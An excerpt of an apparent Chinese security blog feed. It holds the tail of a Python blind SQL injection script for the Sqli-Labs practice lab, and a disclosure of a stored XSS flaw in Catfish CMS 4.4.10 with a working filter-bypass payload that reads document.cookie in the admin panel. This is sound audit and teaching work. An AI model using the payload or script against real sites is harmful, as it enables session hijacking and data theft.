doubleSearch(midNum,rightNum,i,k)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			doubleSearch(leftNum,midNum,i,k)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	dbNum = findDatabaseNumber()</div><div class="line"> 	<span class="keyword">print</span> <span class="string">"the number of database is "</span>+str(dbNum)</div><div class="line"> 	getDatabaseName(dbNum)</div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less5-6是盲注&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
    
  </entry>
  
  <entry>
    <title>Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</title>
    <link href="http://yoursite.com/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2017/07/11/Catfish-鲶鱼-CMS-V-4-4-10-留言板存储型XSS漏洞/</id>
    <published>2017-07-11T11:34:56.000Z</published>
    <updated>2017-07-11T11:54:16.098Z</updated>
    
    <content type="html"><![CDATA[<p>Catfish(鲶鱼) CMS V 4.4.10 ：<a href="http://www.catfish-cms.com/" target="_blank" rel="external">http://www.catfish-cms.com/</a><br><a id="more"></a></p>
<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>在<code>...\application\index\controller\Index.php</code>中，定义了评论功能。代码如下；<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//添加评论</span></div><div class="line">$data = [</div><div class="line">	<span class="string">'post_id'</span> =&gt; Request::instance()-&gt;post(<span class="string">'id'</span>),</div><div class="line">	<span class="string">'url'</span> =&gt; <span class="string">'index/Index/article/id/'</span>.Request::instance()-&gt;post(<span class="string">'id'</span>),</div><div class="line">	<span class="string">'uid'</span> =&gt; Session::get(<span class="keyword">$this</span>-&gt;session_prefix.<span class="string">'user_id'</span>),</div><div class="line">	<span class="string">'to_uid'</span> =&gt; $beipinglunren[<span class="string">'post_author'</span>],</div><div class="line">	<span class="string">'createtime'</span> =&gt; date(<span class="string">"Y-m-d H:i:s"</span>),</div><div class="line">	<span class="string">'content'</span> =&gt; <span class="keyword">$this</span>-&gt;filterJs(Request::instance()-&gt;post(<span class="string">'pinglun'</span>)),</div><div class="line">	<span class="string">'status'</span> =&gt; $plzt</div><div class="line">];</div><div class="line">Db::name(<span class="string">'comments'</span>)-&gt;insert($data);</div></pre></td></tr></table></figure></p>
<p>评论内容content在经过函数filterJs过滤后插入到数据库中。</p>
<p>filterJs定义在<code>...\application\index\controller\Common.php</code>中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">filterJs</span><span class="params">($str)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">return</span> preg_replace([<span class="string">'/&lt;script[\s\S]*?&lt;\/script&gt;/i'</span>,<span class="string">'/&lt;style[\s\S]*?&lt;\/style&gt;/i'</span>],<span class="string">''</span>,$str);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>仅做了简单的过滤，只要构造下列payload就可绕过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;scr&lt;script&gt;&lt;/script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;script&gt;&lt;/script&gt;ipt&gt;</div></pre></td></tr></table></figure></p>
<p>filterJs会把<code>&lt;script&gt;**&lt;/script&gt;替换为空</code>，从而使插入到数据库中的数据变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;替换为空</div></pre></td></tr></table></figure></p>
<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>以普通账户user登陆，并对文章进行评论</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/2.jpg?raw=true" alt=""></p>
<p>因为Catfish CMS在前端进行了一次编码过滤，若是直接在评论区直接插入payload会被编码转换。所i抓包，将pinglun参数改为payload</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/3.jpg?raw=true" alt=""></p>
<p>admin登陆后台，触发XSS：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/4.jpg?raw=true" alt=""></p>
<p>查看源代码：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/5.jpg?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Catfish(鲶鱼) CMS V 4.4.10 ：&lt;a href=&quot;http://www.catfish-cms.com/&quot;&gt;http://www.catfish-cms.com/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="漏洞分析" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
  </entry>
  
</feed>
